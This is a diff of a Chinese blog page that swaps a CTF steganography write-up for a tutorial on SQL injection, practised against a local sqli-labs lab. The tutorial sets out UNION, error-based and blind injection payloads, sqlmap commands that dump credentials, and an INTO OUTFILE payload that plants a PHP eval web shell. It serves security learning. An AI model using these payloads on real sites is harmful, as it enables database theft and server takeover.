@@ -78,7 +78,7 @@
 <link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="CTF-Misc," />
+  <meta name="keywords" content="sql学习,web安全," />
 
 
 
@@ -94,30 +94,18 @@
 
 
 
-<meta name="description" content="前尘隔海，古屋不再。  &amp;nbsp;&amp;nbsp;这是之前做一道图片隐写题目学到的东西，补充一下之前的写图片隐写术。    考察内容1.LSB隐写   2.图片修复">
-<meta name="keywords" content="CTF-Misc">
+<meta name="description" content="我与世界相遇，我自与世界相蚀，我自不辱使命，使我与众生相聚。摘要：总结一些基础的sql语句。   SQL注入原理&amp;nbsp;&amp;nbsp;它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。">
+<meta name="keywords" content="sql学习,web安全">
 <meta property="og:type" content="article">
-<meta property="og:title" content="png图片隐写">
-<meta property="og:url" content="http://yoursite.com/2017/08/22/1/index.html">
+<meta property="og:title" content="初级sql总结">
+<meta property="og:url" content="http://yoursite.com/2017/08/25/1/index.html">
 <meta property="og:site_name" content="M3tar&#39;s Blog">
-<meta property="og:description" content="前尘隔海，古屋不再。  &amp;nbsp;&amp;nbsp;这是之前做一道图片隐写题目学到的东西，补充一下之前的写图片隐写术。    考察内容1.LSB隐写   2.图片修复">
+<meta property="og:description" content="我与世界相遇，我自与世界相蚀，我自不辱使命，使我与众生相聚。摘要：总结一些基础的sql语句。   SQL注入原理&amp;nbsp;&amp;nbsp;它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/upload_images/misc2.png">
-<meta property="og:image" content="http://yoursite.com/upload_images/m1.png">
-<meta property="og:image" content="http://yoursite.com/upload_images/m2.png">
-<meta property="og:image" content="http://yoursite.com/upload_images/m3.png">
-<meta property="og:image" content="http://yoursite.com/upload_images/m4.png">
-<meta property="og:image" content="http://yoursite.com/upload_images/m5.png">
-<meta property="og:image" content="http://yoursite.com/upload_images/m6.png">
-<meta property="og:image" content="http://yoursite.com/upload_images/m7.png">
-<meta property="og:image" content="http://yoursite.com/upload_images/m9.jpg">
-<meta property="og:image" content="http://yoursite.com/upload_images/m8.png">
-<meta property="og:image" content="http://yoursite.com/upload_images/m10.jpg">
-<meta property="og:updated_time" content="2017-08-25T06:59:43.356Z">
+<meta property="og:updated_time" content="2017-08-25T06:40:21.410Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="png图片隐写">
-<meta name="twitter:description" content="前尘隔海，古屋不再。  &amp;nbsp;&amp;nbsp;这是之前做一道图片隐写题目学到的东西，补充一下之前的写图片隐写术。    考察内容1.LSB隐写   2.图片修复">
-<meta name="twitter:image" content="http://yoursite.com/upload_images/misc2.png">
+<meta name="twitter:title" content="初级sql总结">
+<meta name="twitter:description" content="我与世界相遇，我自与世界相蚀，我自不辱使命，使我与众生相聚。摘要：总结一些基础的sql语句。   SQL注入原理&amp;nbsp;&amp;nbsp;它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。">
 
 
 
@@ -146,13 +134,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2017/08/22/1/"/>
+  <link rel="canonical" href="http://yoursite.com/2017/08/25/1/"/>
 
 
 
 
 
-  <title>png图片隐写 | M3tar's Blog</title>
+  <title>初级sql总结 | M3tar's Blog</title>
   
 
 
@@ -313,7 +301,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/22/1/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/25/1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="M3tar">
@@ -330,7 +318,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">png图片隐写</h1>
+          <h1 class="post-title" itemprop="name headline">初级sql总结</h1>
         
 
         <div class="post-meta">
@@ -342,8 +330,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-22T15:31:43+08:00">
-                2017-08-22
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-25T11:44:30+08:00">
+                2017-08-25
               </time>
             
 
@@ -365,8 +353,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF-Misc/" itemprop="url" rel="index">
-                    <span itemprop="name">CTF-Misc</span>
+                  <a href="/categories/web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
                   </a>
                 </span>
 
@@ -402,41 +390,115 @@
       
 
       
-        <blockquote class="blockquote-center"><br>前尘隔海，古屋不再。</blockquote>
+        <p><blockquote class="blockquote-center">我与世界相遇，我自与世界相蚀，我自不辱使命，使我与众生相聚。</blockquote><br><strong>摘要：</strong>总结一些基础的sql语句。  </p>
+<h2 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h2><p>&nbsp;&nbsp;它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。<br><a id="more"></a></p>
+<h2 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h2><p>&nbsp;&nbsp;sql注入分类主要还是分为数字型注入和字符型注入。至于说的post注入，cookie注入，http头注入，盲注···个人觉得都是可以分开囊括在里面的，只是这些是根据注入字段在的位置进行的命名。    </p>
+<p>下面就讲一些学到现在我见过的的注入分类吧。</p>
+<ul>
+<li>GET注入 </li>
+<li>POST注入</li>
+<li>http头注入</li>
+<li>cookie注入</li>
+<li>报错的注入</li>
+<li>布尔盲注</li>
+<li>基于时间的盲注</li>
+</ul>
+<h2 id="注入基本操作-（GET注入为例）"><a href="#注入基本操作-（GET注入为例）" class="headerlink" title="注入基本操作 （GET注入为例）"></a>注入基本操作 （GET注入为例）</h2><h3 id="第一步：判断是否存在注入"><a href="#第一步：判断是否存在注入" class="headerlink" title="第一步：判断是否存在注入"></a>第一步：判断是否存在注入</h3><p>GET注入一般看源代码就可以看到。形如：$_GET[“ID”] ID就是参数  </p>
+<p>   以id为例：  </p>
+<p> 1） url ? id=1                返回正常  </p>
+<p> 2） url ? id=1’               出错，页面异常  </p>
+<p> 3） url ? id=1 and 1=1        返回正常  </p>
+<p> 4） url ? id=1 and 1=2        返回错误</p>
+<p>以上步骤满足，可能存在SQL注入漏洞</p>
+<p>总结：  </p>
+<p>  <strong>出现过的SQL语句总结：</strong></p>
+<font color="red">（不构造那种双闭合语句，一定记得注释 –+ 或者 #）</font>
 
-<p>&nbsp;&nbsp;这是之前做一道图片隐写题目学到的东西，补充一下之前的写图片隐写术。   </p>
-<h2 id="考察内容"><a href="#考察内容" class="headerlink" title="考察内容"></a>考察内容</h2><p>1.LSB隐写  </p>
-<p>2.图片修复<br><a id="more"></a><br>题目图片</p>
-<p><img src="/upload_images/misc2.png" alt=""></p>
-<h2 id="知识储备"><a href="#知识储备" class="headerlink" title="知识储备"></a>知识储备</h2><p>扔一下相关学习的网站：  </p>
-<p>世安杯-LSB隐写-png：<a href="http://blog.csdn.net/fuzz_nancheng/article/details/53384353?locationNum=4&amp;fps=1" target="_blank" rel="external">http://blog.csdn.net/fuzz_nancheng/article/details/53384353?locationNum=4&amp;fps=1</a>  </p>
-<p>CTF之隐写：<br><a href="http://www.jianshu.com/p/02fdd5edd9fc" target="_blank" rel="external">http://www.jianshu.com/p/02fdd5edd9fc</a>  </p>
-<p>隐写术总结：<br><a href="http://bobao.360.cn/learning/detail/243.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/243.html</a>  </p>
-<p>stegsolve的用法：<br>Stegsolve——Analyse——Frame Browser。浏览每个颜色通道的每一位，看是否隐藏了二维码<br>（二维码在线解码：<a href="http://tool.chinaz.com/qrcode/）" target="_blank" rel="external">http://tool.chinaz.com/qrcode/）</a>  </p>
-<p>Stegsolve——Analyse——Data Extract。这个是使用ASCII隐写的时候可以查看的。  </p>
-<p>Stegsolve——Analyse——file format。查看文件格式，结合IDAT结构是否异常，结合编程。  </p>
-<p>Stegsolve——Analyse——frame browser。可以查看GIF文件每一帧的图片。  </p>
-<p>Stegsolve——Analyse——image combiner双图分析  </p>
-<h3 id="LSB隐写"><a href="#LSB隐写" class="headerlink" title="LSB隐写"></a>LSB隐写</h3><p>&nbsp;&nbsp;这个题学到很多知识。简述一下，先看到提示，最低最低位，最开始跑偏了，想成了图片缺失，在最低位出现flag，后来改了像素，变成了另外一张图片，（当时的启发由于这个网站：<a href="http://www.jianshu.com/p/02fdd5edd9fc）" target="_blank" rel="external">http://www.jianshu.com/p/02fdd5edd9fc）</a>  后来出现的图片出现了类似像素的东西，就很丑，，然后也不会了，再看一下，是一个png图片，考虑扔进stegsolve看一下，最低位，</p>
-<p><img src="/upload_images/m1.png" alt="">  </p>
-<p> <img src="/upload_images/m2.png" alt=""> </p>
-<p>隐约间看到了key:paaaasword LSB   </p>
-<p>&nbsp;&nbsp;哎呦喂，以为出来了，看到hint，秘密之所以是秘密，因为秘密需要秘密去探寻，就考虑里面怕是有txt，LSB隐写，喜极而泣的在kali里面搞啊搞（搞的方法是：使用一个github上一个工具来处理-cloacked-pixel(具体用法见<a href="https://github.com/cyberinc/cloacked-pixel)。" target="_blank" rel="external">https://github.com/cyberinc/cloacked-pixel)。</a>  </p>
-<p>&nbsp;&nbsp;我在kali下进行测试的。先将文件解压，并将png文件放进去，在命令行下进入到该文件夹。），密码试了7次（可能不止，还有自己输错的），最后密码是 ： paaaasword<br>大概是在kali里面这样的情况：  </p>
-<p> <img src="/upload_images/m3.png" alt="">  </p>
-<p>&nbsp;&nbsp;然后使用命令python lsb.py extract misc2.png 111.txt  paaaassword<br>可以得到隐写的文件111.txt。  </p>
-<p>ps:extract指的是提取<br>misc2.png指的是导入文件名<br>111.txt指的是导出文件名<br>paaaasword指的是密码（此处根据提示猜测）</p>
-<p>&nbsp;&nbsp;当然，我天真的以为，txt里面就是我心心念念的flag，打开，试了的所有txt都是乱码，</p>
-<p> <img src="/upload_images/m4.png" alt="">   </p>
-<h3 id="图片修复"><a href="#图片修复" class="headerlink" title="图片修复"></a>图片修复</h3><p>我猜里面还有一个图片，winhex打开，看一下文件头，  </p>
-<p> <img src="/upload_images/m5.png" alt="">   </p>
-<p> &nbsp;&nbsp;啧，和这个png很像嘛，百度一下文件头，<a href="http://www.jianshu.com/p/02fdd5edd9fc" target="_blank" rel="external">http://www.jianshu.com/p/02fdd5edd9fc</a><br>文件怕是损坏了，修复出来，编辑——粘贴字节8，   </p>
-<p> <img src="/upload_images/m6.png" alt="">    </p>
-<p>改后缀，png，看到曙光了，是个二维码，  </p>
-<p> <img src="/upload_images/m7.png" alt="">   </p>
-<p>&nbsp;&nbsp;哇，兴奋的搓手手，赶紧在线解密，<br> <img src="/upload_images/m9.jpg" alt=""> ，啥，识别不出来，用手机，还是识别不出来，哇，对比一下正常的二维码，定位点呢，定位点不对啊。搞到ps里面，emmm，截图成四块，第四块好像有一个反向，再拼起来，扫一下，终于对了。</p>
-<p> <img src="/upload_images/m8.png" alt="">  </p>
-<p>　做出来之后的我  <img src="/upload_images/m10.jpg" alt=""> 本来还想打爆出题人，但是现在已经没有力气了。不过真的学到很多，嘻嘻嘻~</p>
+<pre><code>1）select * from table where id = &apos;input&apos;   
+
+2) select * from table where id = (&apos;input&apos;)  
+
+3) select * from table where id = (&quot;input&quot;)   
+
+4) select * from table where id = (input)     
+</code></pre><h3 id="第二步：-找到注入点，进行基础的sql语句尝试："><a href="#第二步：-找到注入点，进行基础的sql语句尝试：" class="headerlink" title="第二步：  找到注入点，进行基础的sql语句尝试："></a>第二步：  找到注入点，进行基础的sql语句尝试：</h3><p>（以下是用GET注入为例的）  </p>
+<p>第一步：用 order by 来爆字段数，如果没有反应，则在后面加–+或者/*或者#注释掉后面的内容  </p>
+<pre><code>http://127.0.0.1/sqli/sqli-labs-master/Less-1/?id=1&apos;)) order by 5 --+
+</code></pre><p>第二步：显示错误位，and 1=2 union select 1,2,3,4,5,6，…..（这一步一定记得前面必须输入错误的，才能爆出敏感信息）</p>
+<pre><code>http://127.0.0.1/sqli/sqli-labs-master/Less-1/?id=-1&apos; union select 1,2,3--+
+</code></pre><p>爆库:select SCHEMA_NAME from information_schema.SCHEMATA limit 5,1</p>
+<p>第三步：显示版本，当前用户，数据库路径，   </p>
+<pre><code>1） and 1=2 union select 1,2,group_concat(version(),0x3a,user(),0x3a,@@datadir),4    
+
+2）  and 1=2 union select 1,2,database()  
+</code></pre><p>第四步：爆表       </p>
+<pre><code>and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()  --+  
+</code></pre><p>第五步：爆列    </p>
+<pre><code>and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name= &apos;表名的hex&apos; （&apos;users&apos;）--+  
+</code></pre><p>第六步： 爆字段     </p>
+<pre><code>and 1=2 union select 1,2,group_concat(username,0x3a,password) from 表名 (不用单引号）--+  
+</code></pre><h2 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h2><p>  解决方式：burpsuite + sqlmap<br>最简单的比如：前端验证， 直接绕过即可  </p>
+<p>这里详细讲述一下利用sqlmap解决的办法：    </p>
+<h3 id="1）抓包，最后一行就是参数值"><a href="#1）抓包，最后一行就是参数值" class="headerlink" title="1）抓包，最后一行就是参数值"></a>1）抓包，最后一行就是参数值</h3><pre><code>sqlmap -u &quot;url&quot; --data &quot;参数（就是最后一行）&quot; --risk=3 --level=5 --dbs  
+</code></pre><h3 id="2）将抓包得到的post请求复制为txt"><a href="#2）将抓包得到的post请求复制为txt" class="headerlink" title="2）将抓包得到的post请求复制为txt"></a>2）将抓包得到的post请求复制为txt</h3><p>  注意：在kali里面新建文件夹后使用vim   </p>
+<pre><code>vim使用方法：   vim 1.txt 回车 粘贴内容  esc键:wq 回车  
+</code></pre><p>运行sqlmap并使用如下命令（ 括号里面可以不写 ）：  </p>
+<pre><code>./sqlmap -r search-1.txt (-p 参数)     
+</code></pre><p>或者：</p>
+<pre><code>sqlmap -r &quot;1.txt&quot; -p &quot;参数&quot; --dbs
+</code></pre><p>这里参数 -r 是让sqlmap加载我们的post请求1.txt，而-p 应该比较熟悉，指定注入用的参数(如果没写，就会自己检测的)</p>
+<h3 id="3）自动搜索表单"><a href="#3）自动搜索表单" class="headerlink" title="3）自动搜索表单"></a>3）自动搜索表单</h3><pre><code>sqlmap -u url  --forms
+</code></pre><h2 id="HTTP头注入"><a href="#HTTP头注入" class="headerlink" title="HTTP头注入"></a>HTTP头注入</h2><p>基本上http头都有可能出现能注入的地方。推荐阅读这个链接<br><a href="http://www.cnblogs.com/softidea/p/5325079.html" target="_blank" rel="external">http头注入</a></p>
+<h2 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h2><p>cookie注入，这里主要讲解一下利用sqlmap，因为手工的cookie注入，现在我还没遇到，遇到之后在做补充。  </p>
+<h3 id="基本用法："><a href="#基本用法：" class="headerlink" title="基本用法："></a>基本用法：</h3><p>&nbsp;&nbsp;这里要进行cookie注入，就要先注册，然后F12 就出现一个cookies 就可以进行cookie注入</p>
+<h3 id="相关语句"><a href="#相关语句" class="headerlink" title="相关语句"></a>相关语句</h3><p> <a href="http://zydhacker.blog.163.com/blog/static/211795073201461182522552/" target="_blank" rel="external">网上的相关资源</a></p>
+<p>命令1跑表  </p>
+<pre><code>sqlmap -u &quot;url&quot; --cookie &quot;参数&quot; --table --level 2
+</code></pre><p>命令2字段 </p>
+<pre><code>sqlmap -u &quot;URL&quot; --cookie &quot;参数&quot; --columns -T 表段 --level 2
+</code></pre><p>命令3跑密码  </p>
+<pre><code>sqlmap -u &quot;url&quot; --cookie &quot;参数&quot; --dump -T 表段 -C “字段，字段” --level 2
+</code></pre><h2 id="报错的注入"><a href="#报错的注入" class="headerlink" title="报错的注入"></a>报错的注入</h2><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p>1)猜测注入语句，不再赘述.  </p>
+<p>2)语句测试，当使用 1’union selcet 1,2,3 –+ 返回还是正常页面，因此我们要利用报错信息  </p>
+<p>3)  </p>
+<pre><code>1′ and ( select 1 from (select count(),concat(‘~’,’~’,database(),’~’,’~’,floor(rand()2))name from information_schema.tables group by name)b)–+  
+</code></pre><p>含义：取名concat(‘~’,’~’,database(),’~’,’~’,floor(rand()2))为name，count()name的个数，这时候会报错，从而爆出database()的值，’~’的用途在于方便识别。  </p>
+<p>整个语句分析：  </p>
+<p>整体相当于select 1 from b；  </p>
+<p>其中b = select count(),concat(‘~’,’~’,database(),’~’,’~’,floor(rand()2))name from information_schema.tables group by name ，count()name的个数；   </p>
+<p>name=concat(‘~’,’~’,database(),’~’,’~’,floor(rand()2))</p>
+<p>4） 进行注入 </p>
+<p>语句构造：  </p>
+<p>1′and (select 1 from (select count(<em>),(concat(“~”,(select 报错语句),”~”,floor(rand()</em>2)))name from information_schema.tables group by name)b)  </p>
+<font color="red">解释语句</font>
+
+<pre><code>floor() 是取整数 rand()在0和1之间产生一个随机数
+rand(0)*2 将取0到2的随机数 floor(rand()*2)有两条记录就会报错 
+floor(rand(0)*2) 记录需为3条以上，且3条以上必报错，返回的值是有规律的
+count(*) 是用来统计结果的，相当于刷新一次结果 
+group by 在对数据进行分组时会先看看虚拟表里有没有这个值，没有的话就插入存在的话count(*)加1 在使用group by时floor(rand(0)*2)会被执行一次，若虚表不存在记录，插入虚表时会再执行一次
+</code></pre><h3 id="个人常用的基于错误的语句"><a href="#个人常用的基于错误的语句" class="headerlink" title="个人常用的基于错误的语句"></a>个人常用的基于错误的语句</h3><pre><code>1./*爆表库*/(select 1 from (select count(*),(concat(“~”,(select table_name from information_schema.tables where table_schema=database() limit 0,1),”~”,floor(rand()*2)))name from information_schema.tables group by name)b) /*爆表库*/
+2./*爆当前(select 1 from (select count(*),(concat(“~”,current_user,”~”,floor(rand()*2)))name from information_schema.tables group by name)b) /*爆当前用户名*/
+3./*爆所有用户名*/(select 1 from (select count(*),(concat(“~”,(select username from users limit 0,1),”~”,floor(rand()*2)))name from information_schema.tables group by name)b) /*爆所有用户名*/
+</code></pre><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><h3 id="1-布尔盲注出现的情况"><a href="#1-布尔盲注出现的情况" class="headerlink" title="1)布尔盲注出现的情况"></a>1)布尔盲注出现的情况</h3><p>当出现无论输入任何语句页面只有两种情况的时候，即只存在正确页面和错误页面时，而不显示报错信息，这样我们就需要进行布尔盲注。通过猜测目标字符串字符的ascii码来确定字符，但该过程非常繁琐，自动化工具更方便一些。  </p>
+<h3 id="2-语句构造"><a href="#2-语句构造" class="headerlink" title="2)语句构造"></a>2)语句构造</h3><p>1’ and (ascii(substr(database(),1,1)))&gt;100 –+</p>
+<p>返回正确页面说明该范围正确，返回错误页面相当于范围不正确，最后用等号确定。</p>
+<h2 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h2><h3 id="1-基于时间的盲注出现的情况"><a href="#1-基于时间的盲注出现的情况" class="headerlink" title="1)基于时间的盲注出现的情况"></a>1)基于时间的盲注出现的情况</h3><p>这种情况下就是所有语句下页面只存在正确的一种，这样就用到了基于时间的盲注，原理是如果正确就执行sleep()函数，使程序挂起，这样我们就可以知道语句正确还是错误了。一般使用sleep(5)，使程序挂起5秒钟。  </p>
+<h3 id="2-语句构造-1"><a href="#2-语句构造-1" class="headerlink" title="2)语句构造"></a>2)语句构造</h3><p>1′ and (select if (ascii(substr(database(),1,1))&gt;100,sleep(5),NULL)) –+</p>
+<p>数据库名称第一个字符的ascii码是否大于100，正确则产生5s的延迟，错误则返回空。通过这样database()可用查询信息替换，以此来爆出表名列名数据等等。  </p>
+<p>也有benchmark()延时注入，与sleep用法相似。</p>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="一句话提权等"><a href="#一句话提权等" class="headerlink" title="一句话提权等"></a>一句话提权等</h3><p>直接写一句话(要知道物理路径) ，连接菜刀   </p>
+<pre><code>and 1=2 union select 1,2,&apos;&lt;?php @eval($_post[&quot;mima&quot;]) ?&gt;&apos;,4 into outfile &apos;D:\\xampp\\www\\test.php&apos;  --+ 
+</code></pre> <font color="orange">记住一定要用两个反斜杠，用一个的话可能会出现转义 </font>
+
+<h3 id="中间插入"><a href="#中间插入" class="headerlink" title="中间插入"></a>中间插入</h3><p>如果强行要在1，**，3中插入 语句这样构造：<br>  爆表：   </p>
+<pre><code>id=-1&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&apos;database&apos;  --+    
+</code></pre><h3 id="一些语句的解释"><a href="#一些语句的解释" class="headerlink" title="一些语句的解释"></a>一些语句的解释</h3><p>1.group_concat的意思是全部列出来   </p>
+<p>2.version()——MySQL版本  </p>
+<p>3.concat(str1,str2…)——没有分隔符地连接字符串  </p>
+<p>4.concat_ws(separator,str1,str2,…)——含有分隔符地连接字符串</p>
+<p>5.group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据 </p>
+<p>6.0x3a是”:”的十六进制，在这里把它作为分隔符</p>
 
       
     </div>
@@ -455,7 +517,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/CTF-Misc/" rel="tag"><i class="fa fa-tag"></i> CTF-Misc</a>
+            <a href="/tags/sql学习/" rel="tag"><i class="fa fa-tag"></i> sql学习</a>
+          
+            <a href="/tags/web安全/" rel="tag"><i class="fa fa-tag"></i> web安全</a>
           
         </div>
       
@@ -468,8 +532,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/08/21/1/" rel="next" title="图片隐写术总结">
-                <i class="fa fa-chevron-left"></i> 图片隐写术总结
+              <a href="/2017/08/22/1/" rel="next" title="png图片隐写">
+                <i class="fa fa-chevron-left"></i> png图片隐写
               </a>
             
           </div>
@@ -477,10 +541,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/08/25/1/" rel="prev" title="初级sql总结">
-                初级sql总结 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -657,7 +717,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#考察内容"><span class="nav-number">1.</span> <span class="nav-text">考察内容</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#知识储备"><span class="nav-number">2.</span> <span class="nav-text">知识储备</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#LSB隐写"><span class="nav-number">2.1.</span> <span class="nav-text">LSB隐写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#图片修复"><span class="nav-number">2.2.</span> <span class="nav-text">图片修复</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL注入原理"><span class="nav-number">1.</span> <span class="nav-text">SQL注入原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL注入分类"><span class="nav-number">2.</span> <span class="nav-text">SQL注入分类</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#注入基本操作-（GET注入为例）"><span class="nav-number">3.</span> <span class="nav-text">注入基本操作 （GET注入为例）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#第一步：判断是否存在注入"><span class="nav-number">3.1.</span> <span class="nav-text">第一步：判断是否存在注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第二步：-找到注入点，进行基础的sql语句尝试："><span class="nav-number">3.2.</span> <span class="nav-text">第二步：  找到注入点，进行基础的sql语句尝试：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POST注入"><span class="nav-number">4.</span> <span class="nav-text">POST注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1）抓包，最后一行就是参数值"><span class="nav-number">4.1.</span> <span class="nav-text">1）抓包，最后一行就是参数值</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2）将抓包得到的post请求复制为txt"><span class="nav-number">4.2.</span> <span class="nav-text">2）将抓包得到的post请求复制为txt</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3）自动搜索表单"><span class="nav-number">4.3.</span> <span class="nav-text">3）自动搜索表单</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP头注入"><span class="nav-number">5.</span> <span class="nav-text">HTTP头注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cookie注入"><span class="nav-number">6.</span> <span class="nav-text">cookie注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基本用法："><span class="nav-number">6.1.</span> <span class="nav-text">基本用法：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#相关语句"><span class="nav-number">6.2.</span> <span class="nav-text">相关语句</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#报错的注入"><span class="nav-number">7.</span> <span class="nav-text">报错的注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#步骤"><span class="nav-number">7.1.</span> <span class="nav-text">步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#个人常用的基于错误的语句"><span class="nav-number">7.2.</span> <span class="nav-text">个人常用的基于错误的语句</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#布尔盲注"><span class="nav-number">8.</span> <span class="nav-text">布尔盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-布尔盲注出现的情况"><span class="nav-number">8.1.</span> <span class="nav-text">1)布尔盲注出现的情况</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-语句构造"><span class="nav-number">8.2.</span> <span class="nav-text">2)语句构造</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基于时间的盲注"><span class="nav-number">9.</span> <span class="nav-text">基于时间的盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-基于时间的盲注出现的情况"><span class="nav-number">9.1.</span> <span class="nav-text">1)基于时间的盲注出现的情况</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-语句构造-1"><span class="nav-number">9.2.</span> <span class="nav-text">2)语句构造</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#其他"><span class="nav-number">10.</span> <span class="nav-text">其他</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#一句话提权等"><span class="nav-number">10.1.</span> <span class="nav-text">一句话提权等</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#中间插入"><span class="nav-number">10.2.</span> <span class="nav-text">中间插入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#一些语句的解释"><span class="nav-number">10.3.</span> <span class="nav-text">一些语句的解释</span></a></li></ol></li></ol></div>
             
 
           </div>
